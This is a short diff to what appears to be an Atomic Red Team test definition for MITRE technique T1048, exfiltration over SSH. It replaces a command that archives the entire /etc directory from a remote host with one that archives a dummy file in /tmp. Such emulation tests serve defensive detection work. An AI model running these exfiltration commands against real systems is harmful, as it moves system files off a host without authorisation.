@@ -31,7 +31,8 @@ atomic_tests:
     name: sh
     elevation_required: false
     command: |
-      ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+      echo Test file > /tmp/T1048.txt
+      ssh #{domain} "(tar -zcvf /tmp/T1048.txt)" > /tmp/T1048.tar.gz
 
 - name: Exfiltration Over Alternative Protocol - SSH
   description: |
